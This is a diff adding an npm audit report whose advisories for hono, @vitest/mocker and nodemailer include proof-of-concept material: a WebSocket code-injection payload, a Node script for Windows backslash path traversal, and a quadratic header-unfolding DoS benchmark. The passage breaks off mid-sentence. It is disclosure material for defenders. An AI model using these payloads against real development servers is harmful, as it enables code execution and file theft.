@@ -1,0 +1,499 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1242595,
+          "path": "lib__mcp-client>@modelcontextprotocol/sdk>hono",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "hono",
+      "target": "4.13.13",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1242883,
+          "path": "apps__alloy-embedding-api>express-rate-limit>ip-address",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "ip-address",
+      "target": "10.7.4",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1243066,
+          "path": ".>@openai/agents>@openai/agents-core>zod",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1243066,
+          "path": "lib__ai-engine>@anthropic-ai/sdk>zod",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": null,
+      "target": null,
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1243074,
+          "path": ".>express>body-parser",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "body-parser",
+      "target": "2.4.0",
+      "depth": 3
+    },
+    {
+      "action": "review",
+      "module": "@vitest/mocker",
+      "resolves": [
+        {
+          "id": 1242767,
+          "path": ".>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242767,
+          "path": "apps__alloy-embedding-api>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242767,
+          "path": "artifacts__a11oy>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242767,
+          "path": "packages__cognitive-reflexivity>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242769,
+          "path": ".>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242769,
+          "path": "apps__alloy-embedding-api>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242769,
+          "path": "artifacts__a11oy>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1242769,
+          "path": "packages__cognitive-reflexivity>vitest>@vitest/mocker",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "nodemailer",
+      "resolves": [
+        {
+          "id": 1242826,
+          "path": ".>nodemailer",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "zod",
+      "resolves": [
+        {
+          "id": 1243066,
+          "path": "apps__alloy-embedding-api>zod",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1242595": {
+      "findings": [
+        {
+          "version": "4.13.9",
+          "paths": [
+            "lib__mcp-client>@modelcontextprotocol/sdk>hono"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/hono/security/advisories/GHSA-5r4p-p66f-jhc7\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111757\n- https://github.com/honojs/hono/commit/8b05c774ef1555c70f5ba5e2991b7e77cc3635cc\n- https://github.com/honojs/hono/releases/tag/v4.13.11\n- https://github.com/advisories/GHSA-5r4p-p66f-jhc7",
+      "created": "2026-10-20T14:36:11.000Z",
+      "id": 1242595,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`serveStatic` decodes the request path a second time after Hono has already decoded it for routing. A crafted request can be routed as one path and served as another, so middleware mounted on a static prefix does not run for a file under that prefix.\n\n### Details\n\nHono decodes the request path once before routing. `serveStatic` decoded it again before resolving the file. With a malformed percent-encoded sequence, the first decode leaves part of the path encoded, the router matches the encoded form, and the second decode resolves the real directory. The file is still resolved inside the configured root; this is not a traversal outside it.\n\n### Impact\n\nAn unauthenticated attacker may reach static files without the middleware on their prefix running, for example an authentication check. This affects applications that mount middleware on part of the directory served by `serveStatic`. Applications that serve only public files are not affected.",
+      "reported_by": null,
+      "title": "Hono: `serveStatic` decodes the request path a second time, leading to bypass of middleware on static paths",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111757"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "hono",
+      "vulnerable_versions": ">=4.12.4 <4.13.11",
+      "github_advisory_id": "GHSA-5r4p-p66f-jhc7",
+      "recommendation": "Upgrade to version 4.13.11 or later",
+      "patched_versions": ">=4.13.11",
+      "updated": "2026-10-20T14:36:13.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-174"
+      ],
+      "url": "https://github.com/advisories/GHSA-5r4p-p66f-jhc7"
+    },
+    "1242767": {
+      "findings": [
+        {
+          "version": "4.1.11",
+          "paths": [
+            ".>vitest>@vitest/mocker"
+          ]
+        },
+        {
+          "version": "4.1.11",
+          "paths": [
+            "apps__alloy-embedding-api>vitest>@vitest/mocker"
+          ]
+        },
+        {
+          "version": "4.1.11",
+          "paths": [
+            "artifacts__a11oy>vitest>@vitest/mocker"
+          ]
+        },
+        {
+          "version": "4.1.11",
+          "paths": [
+            "packages__cognitive-reflexivity>vitest>@vitest/mocker"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-qxg6-89mg-rqv8\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112949\n- https://github.com/vitest-dev/vitest/commit/15cc006aa9f8683dc5f7e895d011fa7dc751ce35\n- https://github.com/vitest-dev/vitest/commit/b825313243dc55757e8d7c0f9e7a792135e13473\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.12\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.3\n- https://github.com/advisories/GHSA-qxg6-89mg-rqv8",
+      "created": "2026-10-21T19:54:26.000Z",
+      "id": 1242767,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`@vitest/mocker`'s `interceptorPlugin` accepts mock registrations on Vite's dev-server WebSocket with no authentication, and interpolates the mock's `url` into generated module source without escaping. A client that can reach the dev server can make it serve arbitrary JavaScript in place of any project module, which then runs in the developer's browser on the dev-server origin.\n\nSame handler and same unauthenticated caller as GHSA-82fw-gwwq-j7x9; that fix (`8ff9b9a9efca7c6cfd5243569440de8d7a33aec4`, PR #10972) hardened only the `redirect` branch and left the `manual` branch reaching the unescaped generator.\n\n### Patches\n\nFixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. `createManualModuleSource` now serializes the module URL and the export names with `JSON.stringify`, so a registered mock cannot change the generated code.\n\nProjects that call `mockerPlugin()` or `interceptorPlugin()` directly need `@vitest/mocker` 4.1.12 or 5.0.3.\n\n### Details\n\n`packages/mocker/src/utils.ts:6-9` builds module source by string interpolation:\n\n```ts\nexport function createManualModuleSource(moduleUrl: string, exports: string[], globalAccessor = '\"__vitest_mocker__\"'): string {\n  const source = `\nconst __factoryModule__ = await globalThis[${globalAccessor}].getFactoryModule(\"${moduleUrl}\");\n`\n```\n\n`moduleUrl` lands inside a double-quoted JavaScript string with no escaping or validation.\n\n`packages/mocker/src/node/interceptorPlugin.ts:66-93` feeds it straight from the socket:\n\n```ts\nconfigureServer(server) {\n  if (options.registerWebSocketEvents === false) { return }\n  server.ws.on('vitest:interceptor:register', (event: MockedModuleSerialized) => {\n    if (event.type === 'manual') {\n      const module = ManualMockedModule.fromJSON(event, async () => {\n        const keys = await getFactoryExports(event.url)\n        return Object.fromEntries(keys.map(key => [key, null]))\n      })\n      registry.add(module)                       // no validation of `id` or `url`\n    }\n    else {\n      if (event.type === 'redirect') { /* fs allowlist check added in #10972 */ }\n```\n\n`event.id` chooses which module is hijacked; `event.url` is what gets interpolated. The `load` hook (`interceptorPlugin.ts:30-44`) then returns `createManualModuleSource(mock.url, exports, accessor)` for that id.\n\nWith `url = 'x\"); globalThis.ARES_INJECTED = 1; void(\"'` a request for `/src/app.js` is answered with valid, executable JavaScript:\n\n```js\nconst __factoryModule__ = await globalThis[\"__vitest_mocker__\"].getFactoryModule(\"x\"); globalThis.ARES_INJECTED = 1; void(\"\");\n```\n\n`getFactoryExports` (`interceptorPlugin.ts:103-117`) also takes the export-name array from the same socket, and those names are interpolated unescaped too — but each name is emitted into `__factoryModule__[\"X\"]`, `export { __0 as \"X\" }` and `resolvedModule[\"X\"]`, and no payload tested parses in all three positions (all nine candidates were rejected by the parser). It is a hardening gap, not a second usable vector; `url` is the exploited one.\n\n**Who can reach the socket.** Vite 8 answers HTTP 400 to any HMR upgrade carrying an `Origin` header it does not own, so a cross-origin browser page cannot open it — the PoC asserts this for `https://evil.example` and `http://localhost:3000`. The reachable attacker is a non-browser WebSocket client with access to the dev server's port, the same prerequisite under which GHSA-82fw-gwwq-j7x9 was published.\n\n### PoC\n\n`poc/mocker-manual-mock-injection/` — `repro.sh` (exit 0 = vulnerable), `poc.mjs`, `expected.txt`, `env.txt`. Everything lives under a fresh `mktemp` directory deleted on exit, the dev server binds to `127.0.0.1` on an ephemeral port, no external host is contacted, and the payload is only inspected as text — the script never evaluates it.\n\nEnvironment: commit `9e1166959e14bd32298d8a0e85352431c769ec7a`, `@vitest/mocker` 5.0.0, Node v22.23.1, Vite 8.0.11, ws 8.21.3, pnpm 11.24.0, Linux x86_64.\n\n```bash\ngit clone https://github.com/vitest-dev/vitest && cd vitest\ngit checkout 9e1166959e14bd32298d8a0e85352431c769ec7a\npnpm install && pnpm build\nREPO=$(pwd) bash /path/to/poc/mocker-manual-mock-injection/repro.sh\n```\n\nRequired configuration — the public setup documented in `packages/mocker/EXPORTS.md`, which the harness reproduces (`mockerPlugin()` wires `interceptorPlugin` the same way):\n\n```ts\nimport { interceptorPlugin } from '@vitest/mocker/node'\nexport default defineConfig({ plugins: [interceptorPlugin()] })   // or mockerPlugin()\n```\n\nThe attack is one WebSocket message to `ws://<host>:<port>/` with subprotocol `vite-hmr`:\n\n```json\n{ \"type\": \"custom\", \"event\": \"vitest:interceptor:register\",\n  \"data\": { \"type\": \"manual\", \"raw\": \"\", \"id\": \"<abs path of a served module>\",\n            \"url\": \"x\\\"); globalThis.ARES_INJECTED = 1; void(\\\"\" } }\n```\n\nthen answering the server's `vitest:interceptor:resolve` with `{\"type\":\"custom\",\"event\":\"vitest:interceptor:resolved\",\"data\":{\"url\":\"<same url>\",\"keys\":[\"a\"]}}`. The module id can be obtained from the same socket via `vitest:mocks:resolveId` when `mockerPlugin()` is used.\n\nObserved output:\n\n```\nPASS  precondition: Vite rejects a WebSocket upgrade sent with Origin https://evil.example  result=400\nPASS  precondition: Vite rejects a WebSocket upgrade sent with Origin http://localhost:3000  result=400\nPASS  negative control: with no mock registered the real module is served\nPASS  negative control: a mock with a harmless url replaces the module but injects nothing\n--- module served for /src/app.js ---\n    const __factoryModule__ = await globalThis[\"__vitest_mocker__\"].getFactoryModule(\"x\"); globalThis.ARES_INJECTED = 1; void(\"\");\n\n    let __0 = __factoryModule__[\"a\"]\n    export { __0 as \"a\" }\n    if (__factoryModule__.__factoryPromise != null) {\n      __factoryModule__.__factoryPromise.then((resolvedModule) => {\n        __0 = resolvedModule[\"a\"];\n      })\n    }\nPASS  attacker statement is present in the module the dev server serves\nPASS  the real module body was replaced\nPASS  the injected module parses as JavaScript (Vite import analysis accepted it)\n\nRESULT: VULNERABLE\n```\n\n* **Positive control** — with no mock registered, `/src/app.js` is served with its real body, so the harness demonstrably works.\n* **Negative control** — the same registration with a harmless `url` replaces the module but injects nothing, attributing the injection to the payload rather than to mock registration.\n* **Precondition controls** — the two `Origin` probes record the boundary honestly.\n* Vite's import analysis rejects malformed output (an earlier deliberately-broken payload failed with \"content contains invalid JS syntax\"), so acceptance proves the injected module is valid, executable JavaScript.\n\nReproduced three times from a clean `mktemp` fixture, exit 0 each time.\n\n### Impact\n\nCode injection (CWE-94) by an unauthenticated client. The attacker picks any module id the project serves and replaces its body with arbitrary JavaScript, which executes in the developer's browser on the dev-server origin: reading source through the dev server, reading that origin's storage and cookies, driving further same-origin requests, and persisting across reloads while the mock stays registered. Nothing is written to disk, so it leaves no trace in the repository. Impacts developers who use the public `mockerPlugin()`/`interceptorPlugin()` API documented in `packages/mocker/EXPORTS.md`. Node runs do not register these handlers. Development-only — `configureServer` does not run for `vite build` or `vite preview`.\n\n### Credits\n\n- Thai Son Dinh from VinSOC Labs (R&D)\n\nDisclosure per CONTRIBUTING.md: the analysis and proof of concept were assisted by Claude (Claude Code). The findings were reviewed by the reporter above, who is submitting this report.",
+      "reported_by": null,
+      "title": "Vitest: Code injection via unauthenticated manual mock registration",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112949"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=2.1.0-beta.7 <4.1.12",
+      "github_advisory_id": "GHSA-qxg6-89mg-rqv8",
+      "recommendation": "Upgrade to version 4.1.12 or later",
+      "patched_versions": ">=4.1.12",
+      "updated": "2026-10-21T19:54:27.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-116",
+        "CWE-306"
+      ],
+      "url": "https://github.com/advisories/GHSA-qxg6-89mg-rqv8"
+    },
+    "1242769": {
+      "findings": [
+        {
+          "version": "4.1.11",
+          "paths": [
+            ".>vitest>@vitest/mocker"
+          ]
+        },
+        {
+          "version": "4.1.11",
+          "paths": [
+            "apps__alloy-embedding-api>vitest>@vitest/mocker"
+          ]
+        },
+        {
+          "version": "4.1.11",
+          "paths": [
+            "artifacts__a11oy>vitest>@vitest/mocker"
+          ]
+        },
+        {
+          "version": "4.1.11",
+          "paths": [
+            "packages__cognitive-reflexivity>vitest>@vitest/mocker"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-xp26-3454-mjgp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112950\n- https://github.com/vitest-dev/vitest/commit/15cc006aa9f8683dc5f7e895d011fa7dc751ce35\n- https://github.com/vitest-dev/vitest/commit/b825313243dc55757e8d7c0f9e7a792135e13473\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.12\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.3\n- https://github.com/advisories/GHSA-xp26-3454-mjgp",
+      "created": "2026-10-21T19:48:38.000Z",
+      "id": 1242769,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe path traversal fix released for [GHSA-82fw-gwwq-j7x9](https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9) can be bypassed on Windows by using a backslash in the redirect URL pathname.\n\nThe fixed code joins an attacker-controlled URL pathname with the Vite root using `node:path/posix`, then passes that string to Vite's file allowlist check. On Windows, a value such as `C:/project/root/..\\secret.txt` retains `..\\` during the POSIX join and begins with the allowed root, so the allowlist accepts it. The later `readFile()` call uses Windows filesystem semantics, where the backslash is a path separator, and reads the sibling file outside the configured root.\n\nI reproduced the issue with the published `@vitest/mocker` packages in both fixed release lines:\n\n- `@vitest/mocker@4.1.11`\n- `@vitest/mocker@5.0.0`\n\nThe current `main` source at commit `2ce29d5fa758046e5453bd92b8ed6c9da9709bb5` has the same behavior.\n\n## Patches\n\nFixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. The redirect registration now converts backslashes in the URL pathname to forward slashes before it joins the pathname with the root, so `..\\` resolves the same as `../` and the allowlist check rejects it.\n\n## Relationship to GHSA-82fw-gwwq-j7x9\n\nThis is a bypass of the accepted fix, not a separate unrelated path. It uses the same `vitest:interceptor:register` redirect registration and the same file-reading sink as the original advisory. A forward-slash traversal is rejected after the fix, while the equivalent Windows backslash traversal is accepted.\n\nThe original advisory marks 4.1.11 and 5.0.0-rc.2 as patched. The newly affected ranges introduced by the incomplete fix are therefore:\n\n- `4.1.11`\n- `>=5.0.0-rc.2, <5.0.3`\n\nOlder affected releases remain covered by GHSA-82fw-gwwq-j7x9.\n\n## Root cause\n\n`packages/mocker/src/node/interceptorPlugin.ts` imports `join` from `node:path/posix`. Redirect registration currently performs the equivalent of:\n\n```ts\nconst redirect = join(server.config.root, redirectUrl.pathname)\nif (!isFileLoadingAllowed(server.config, redirect)) return\nevent.redirect = redirect\n```\n\nThe registered value later reaches:\n\n```ts\nreadFile(mock.redirect, 'utf-8')\n```\n\nVite's allowlist check expects a normalized absolute filesystem path. On Windows, POSIX joining does not normalize backslashes, but `readFile` interprets them as separators. The check and the sink therefore interpret the same string differently.\n\nThe authenticated browser RPC fallback in `packages/browser/src/node/rpc.ts` is not affected: it joins the path with `pathe`, which converts backslashes to forward slashes before the access check. The reproduction below targets the public mocker WebSocket registration path.\n\n## Preconditions and impact\n\nA client that can reach a Vite server using the public `mockerPlugin` or standalone `interceptorPlugin` WebSocket registration can register a redirect mock. On Windows, the client can then request the registered module and read a file outside `server.fs.allow` that the Vitest/Vite process account can access. Vitest Browser Mode does not register these WebSocket handlers in the affected versions.\n\nThe reproduction uses an unauthenticated Vite HMR WebSocket connection and a normal HTTP GET. It does not call the plugin's internal transform API. The practical network reachability is the same deployment precondition described by the original advisory; default loopback-only development servers are correspondingly less exposed.\n\n## Reproduction\n\nTested on GitHub-hosted Windows Server 2025 with Node.js 22. The test creates only temporary synthetic files: a Vite root directory and a sibling `secret.txt` containing a canary.\n\nInstall dependencies for either affected line:\n\n```console\nnpm install @vitest/mocker@4.1.11 vite@7.1.5 ws@8.18.3\n# or\nnpm install @vitest/mocker@5.0.0 vite@7.1.5 ws@8.18.3\nnode poc.mjs\n```\n\n`poc.mjs`:\n\n```js\nimport { mkdir, writeFile } from 'node:fs/promises'\nimport { join } from 'node:path'\nimport { tmpdir } from 'node:os'\nimport { randomUUID } from 'node:crypto'\nimport { interceptorPlugin } from '@vitest/mocker/node'\nimport { createServer } from 'vite'\nimport { WebSocket } from 'ws'\n\nconst base = join(tmpdir(), `vitest-path-${randomUUID()}`)\nconst root = join(base, 'root')\nconst secret = join(base, 'secret.txt')\nawait mkdir(root, { recursive: true })\nawait writeFile(secret, 'SYNTHETIC_OUTSIDE_ROOT_CANARY')\n\nconst server = await createServer({\n  root,\n  configFile: false,\n  logLevel: 'silent',\n  server: { fs: { allow: [root] } },\n  plugins: [\n    {\n      name: 'validation:virtual-modules',\n      enforce: 'pre',\n      resolveId(id) {\n        if (id === '/control' || id === '/bypass') return id\n      },\n    },\n    interceptorPlugin(),\n  ],\n})\n\nawait server.listen()\nconst port = new URL(server.resolvedUrls.local[0]).port\nconst baseUrl = server.resolvedUrls.local[0]\n\nfunction register(id, redirect) {\n  return new Promise((resolve, reject) => {\n    const socket = new WebSocket(`ws://localhost:${port}`, 'vite-hmr')\n    const timer = setTimeout(() => reject(new Error('registration timeout')), 5000)\n    socket.on('message', (raw) => {\n      let message\n      try { message = JSON.parse(raw.toString()) } catch { return }\n      if (message.type === 'custom' && message.event === 'vitest:interceptor:register:result') {\n        clearTimeout(timer)\n        socket.close()\n        resolve()\n      }\n    })\n    socket.on('open', () => socket.send(JSON.stringify({\n      type: 'custom',\n      event: 'vitest:interceptor:register',\n      data: { type: 'redirect', raw: '', id, url: id, redirect },\n    })))\n    socket.on('error', reject)\n  })\n}\n\ntry {\n  await register('/control', 'traversal:../secret.txt')\n  const controlResponse = await fetch(new URL('/control', baseUrl))\n  const controlBody = await controlResponse.text()\n\n  await register('/bypass', 'traversal:..\\\\secret.txt')\n  const bypassResponse = await fetch(new URL('/bypass', baseUrl))\n  const bypassBody = await bypassResponse.text()\n\n  const result = {\n    platform: process.platform,\n    root,\n    outsideFile: secret,\n    slashTraversalStatus: controlResponse.status,\n    slashTraversalRejected: !controlBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY'),\n    backslashTraversalStatus: bypassResponse.status,\n    backslashTraversalReturnedOutsideCanary: bypassBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY'),\n    returnedBody: bypassBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY') ? 'SYNTHETIC_OUTSIDE_ROOT_CANARY' : null,\n    expectedBackslashTraversalBlocked: process.env.EXPECT_BLOCKED === '1',\n  }\n  console.log(JSON.stringify(result, null, 2))\n  const backslashResultMatchesExpectation = result.expectedBackslashTraversalBlocked\n    ? !result.backslashTraversalReturnedOutsideCanary\n    : result.backslashTraversalReturnedOutsideCanary\n  if (!result.slashTraversalRejected || !backslashResultMatchesExpectation) process.exitCode = 1\n} finally {\n  await server.close()\n}\n```\n\nObserved with `@vitest/mocker@4.1.11`:\n\n```json\n{\n  \"platform\": \"win32\",\n  \"slashTraversalStatus\": 404,\n  \"slashTraversalRejected\": true,\n  \"backslashTraversalStatus\": 200,\n  \"backslashTraversalReturnedOutsideCanary\": true,\n  \"returnedBody\": \"SYNTHETIC_OUTSIDE_ROOT_CANARY\",\n  \"expectedBackslashTraversalBlocked\": false\n}\n```\n\nThe same result was observed with `@vitest/mocker@5.0.0`.\n\nThis includes two useful controls:\n\n1. `traversal:../secret.txt` is rejected and returns 404, confirming the published forward-slash fix is active.\n2. `traversal:..\\secret.txt` returns 200 and the exact outside-root canary, confirming a Windows separator bypass rather than an unrelated route or fixture response.",
+      "reported_by": null,
+      "title": "Vitest: Windows backslash traversal bypasses the @vitest/mocker redirect allowlist fix",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112950"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=4.1.11 <4.1.12",
+      "github_advisory_id": "GHSA-xp26-3454-mjgp",
+      "recommendation": "Upgrade to version 4.1.12 or later",
+      "patched_versions": ">=4.1.12",
+      "updated": "2026-10-21T19:48:39.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-xp26-3454-mjgp"
+    },
+    "1242826": {
+      "findings": [
+        {
+          "version": "10.0.9",
+          "paths": [
+            ".>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-39m8-27wv-hr27\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110871\n- https://github.com/nodemailer/nodemailer/commit/28a5909cec27646cb001dc7e97a8f5d26c973078\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.0.10\n- https://www.vulncheck.com/advisories/nodemailer-3.0.0-before-10.0.10-quadratic-dkim-header-unfolding-denial-of-service\n- https://github.com/advisories/GHSA-39m8-27wv-hr27",
+      "created": "2026-10-22T16:07:04.000Z",
+      "id": 1242826,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nWhen nodemailer DKIM-signs an outbound message, its DKIM message parser unfolds RFC 5322 header continuation lines with a loop that concatenates each continuation line onto the preceding line and then re-tests the anchored regex `/^[ \\t]/` against the growing merged line on every iteration. Re-testing the regex against the ever-growing accumulated line forces a full string flatten proportional to the accumulated length on each iteration, yielding O(n^2) CPU in the number of continuation lines. An application user who influences the size of a header that folds into many continuation lines (most naturally a large recipient list, but also a long custom header, Subject, or References) can drive tens of thousands of continuation lines and block the single-threaded Node.js event loop for seconds during signing, a repeatable denial of service.\n\n## Root Cause\n\nThe invariant that signing a message performs work linear in the message size is violated in the header-unfolding step. In `src/dkim/message-parser.ts`, `parseHeaders()` splits the buffered header block into `lines` and iterates backward; for each line matching the continuation pattern `/^[ \\t]/`, it does `lines[i - 1] += '\\n' + lines[i]` and `lines.splice(i, 1)`. The dominant cost is not the array splice: iterating backward keeps each splice near the shrinking tail, so it shifts only the few trailing header lines. The quadratic cost is the anchored regex test `/^[ \\t]/.test(lines[i])` (together with the `+=` concatenation) evaluated against the growing merged line on every iteration. The `+=` builds an O(1) rope, but the next iteration's regex test forces a full flatten of the entire accumulated line, so the total cost is the sum over all continuation lines, which is O(n^2). The header block is buffered by `checkHeaders` without any size or line-count cap; the DKIM signer's `MAX_MESSAGE_SIZE` and `cacheTreshold` knobs gate the body stream only, not the header block, so nothing bounds the number of continuation lines fed to the loop.\n\n```text\nAffected file and function (verified at the published v10.0.9 artifact, in src/ and compiled verbatim into the published dist output):\n- src/dkim/message-parser.ts: MessageParser.parseHeaders (the continuation-unfold loop that re-tests /^[ \\t]/ against the growing merged line)\n```\n\n## Impact\n\nAn attacker or user who can make an outbound, DKIM-signed message carry a header that folds into a large number of continuation lines can freeze the sending Node.js process during signing. Because Node.js is single-threaded, the synchronous unfold loop starves the entire event loop, halting all other work in the process, and it is repeatable on every such message. The natural lever is a large recipient list: nodemailer's own MIME composer folds a To or Cc value at column 76 into space-prefixed continuation lines, and the count scales linearly with the number of recipients, so a caller-supplied recipient list (common in bulk-mail, notification, and multi-tenant email APIs) turns into tens of thousands of continuation lines. The single precondition is that DKIM signing is enabled, which is a mainstream deliverability configuration. Independent reproduction on Node.js 24 measured roughly 2.8 seconds of event-loop blocking at about 20,000 continuation lines and roughly 11.5 seconds at about 40,000, scaling quadratically; the full composer-to-signer chain with a 60,000-recipient To header blocked for roughly 6.6 seconds. The applications that cap recipient count or header size shrink the exposed population but do not change the per-message availability impact once a large header is accepted.\n\n## Proof of Concept\n\n`Node.js 24; the shipped DKIM signer (require('nodemailer/lib/dkim')) or the exact unfold loop.`\n\nSteps: (1) construct a message whose header block contains one header value folded into many space-prefixed continuation lines (for example by supplying a very large recipient list, which nodemailer's MIME composer folds automatically); (2) DKIM-sign it and observe the event loop stall while `parseHeaders` unfolds the block. A minimal microbenchmark of the exact unfold logic demonstrates the complexity:\n\n```js\n// Reproduces the parseHeaders unfold loop verbatim (Node 24).\nfunction unfold(headerBlock) {\n    const lines = headerBlock.split(/\\r?\\n/);\n    for (let i = lines.length - 1; i > 0; i--) {\n        if (/^[ \\t]/.test(lines[i])) {\n            lines[i - 1] += '\\n' + lines[i];\n            lines.splice(i, 1);\n        }\n    }\n    return lines;\n}\nfunction run(n) {\n    let block = 'To: a@b.c\\r\\n';\n    for (let i = 0; i < n; i++) block += ' cont-' + i + '@example.com,\\r\\n';\n    for (let k = 0; k < 5; k++) block += 'X-H' + k + ': v\\r\\n';\n    const t = Date.now();\n    unfold(block);\n    return Date.now() - t;\n}\nfor (const n of [5000, 10000, 20000, 40000]) console.log(n, run(n) + 'ms');\n```\n\n```text\n5000   27ms\n10000  542ms\n20000  2853ms\n40000  11503ms\n(2x input yields roughly 4x-5x time: quadratic. The cost is the regex re-flatten of the growing merged line, not the splice.)\n```\n\n## Attack Chain\n\n1. **Exposure:** An application DKIM-signs outbound mail (a mainstream deliverability configuration, enabled per transport or per message) for a message whose header size is influenced by a user, for example a large recipient list, a long custom header, Subject, or References.\n2. **Control:** The attacker or user controls the size of that header. The MIME composer folds it deterministically at column 76 into space-prefixed continuation lines that match the continuation pattern, so the continuation-line count scales linearly with the supplied size.\n3. **Path:** Signing pipes the composed message through the DKIM MessageParser; `checkHeaders` buffers the whole header block into `rawHeaders` and calls `parseHeaders()`, the single sink, on every signed message.\n4. **Guard:** No header-size or line-count cap exists between the input and the sink; the signer's body-only size thresholds do not apply to the header block.\n5. **Primitive:** The unfold loop re-tests the anchored regex against the growing merged line on each continuation line, forcing a full flatten per iteration and yielding O(n^2) synchronous CPU.\n6. **Result:** Event-loop starvation of the single-threaded sending process for an attacker-scaled duration, repeatable per message: a denial of service.\n\n## Bypass Evidence\n\nThe relevant guard would be a cap on header-block size or continuation-line count before unfolding. A search of the DKIM module confirms none exists: `checkHeaders` accumulates header chunks unbounded until the header terminator, and the only size knobs (`MAX_MESSAGE_SIZE`, `cacheTreshold`) are checked against the body stream, not the header block. The strongest disproof attempt was that the backward `splice` makes the loop cheap for a single consecutive folded block (so it would not be quadratic); this was refuted by a mechanism-isolation benchmark: removing the splice entirely leaves the loop just as slow (about 11 seconds at 40,000 lines), while precomputing the continuation test on the original lines so the growing merged line is never re-tested collapses it to a few milliseconds. This proves the quadratic driver is the regex re-flatten of the accumulated line, not the array shift, and confirms the loop is quadratic even for a single consecutive folded block. No published advisory covers this file: the disclosed complexity issues all live in the address parser and recipient-normalization code, and the DKIM message parser has never received a complexity fix.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: nodemailer`\n- `Confirmed affected range: <= 10.0.9`\n- `Latest release checked: nodemailer 10.0.9 (npm registry; vulnerable code verified at git tag v10.0.9 and in the published dist output)`\n- `Fix status: not fixed (no released version removes the quadratic unfold or caps header size)`\n\nThe unfold loop is long-standing DKIM code that predates the address-parser complexity fix family, so the exact introducing release is not positively established and the lower bound is left open; the upper bound is verified against the current published artifact, which is vulnerable with no fix.\n\n## Suggested Fix\n\nEnforce linear-time header unfolding and bound the header block. The key correction is to stop re-scanning the growing accumulated line: classify each line's continuation status on the original split lines before merging, and build the unfolded value with an array plus a single join rather than repeatedly re-testing and concatenating the growing string. Simply replacing `splice` with a filter or two-pointer compaction while still re-testing the merged line would not fix the issue, because the regex re-flatten of the accumulated line is the quadratic driver. Independently, impose a configurable maximum on the buffered header-block size or continuation-line count in the message parser and fail closed when it is exceeded, so 